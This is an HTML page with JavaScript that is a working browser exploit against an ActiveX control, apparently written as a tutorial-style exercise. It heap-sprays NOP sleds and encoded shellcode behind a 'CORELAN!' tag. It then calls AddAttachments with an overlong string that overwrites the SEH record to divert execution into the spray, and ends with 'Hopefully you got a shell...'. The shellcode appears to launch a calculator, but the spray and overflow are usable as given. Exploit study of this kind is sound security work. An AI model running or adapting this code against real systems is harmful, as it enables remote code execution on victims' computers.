<html>
<object classid='clsid:F8D07B72-B4B4-46A0-ACC0-C771D4614B82' id='target' ></object>
<script>
chunksize = 0xa000; // 0x1000 = 4096 // 0xa000
nr_of_chunks = 5000; // 200 // 5000

tag = unescape('%u4F43%u4552'); // CORE
tag += unescape('%u414C%u214E'); // LAN!
//tag = unescape('%u3077%u7430'); // CORE
//tag += unescape('%u3077%u7430'); // LAN!

chunk = '';
for ( counter = 0; counter < chunksize; counter++)
{
 chunk += unescape('%u9090%u9090'); // nops 0x1000 (4096) * 2 = 8192
}

document.write("size of 'CORELAN!' tag: " + tag.length.toString() + "<br>");  // 4 bytes (supposed to be 8? unescape halves it)
document.write("size of NOPS at this point : " + chunk.length.toString() + "<br>"); // 8192 bytes
chunk = chunk.substring(0,chunksize - tag.length); // chunksize - tag.length = 4092
document.write("size of NOPS after substring : " + chunk.length.toString() + "<br>"); // hence it should be 4092

shellcode = unescape('%u9090%u9090')
shellcode += unescape('%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u6a5d%u8d01%ub285%u0000%u5000%u3168%u6f8b%uff87%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff%u6163%u636c%u4100')

testarray = new Array();
for ( counter = 0; counter < nr_of_chunks; counter++)
{
 testarray[counter] = tag + chunk + shellcode; // each chunk is 4096 bytes, where it consist of CORELAN! tag and the rest filled with nops
 document.write("Allocated " + (tag.length+chunk.length).toString() + " bytes <br>");
}

alert("Spray done, now time to trigger SEH...")

payload = "" // cannot payload = "A" * 1000

total = 1000

while (payload.length < 272) payload += "A" // cheat

//payload += "BBBB" // EIP
//payload += "\x06\x06\x06\x06" // EIP
payload += "\xff\xff\xff\xff" // EIP

payload += "CCCC" // useless

payload += "DDDD" // useless

payload += "EEEE" // next SEH

//payload += "FFFF" // SEH address
payload += "\x06\x06\x06\x06" // set to 06060606

while (payload.length < total) payload += "G"

target.AddAttachments(payload)

alert("Hopefully you got a shell...")
</script>
</html>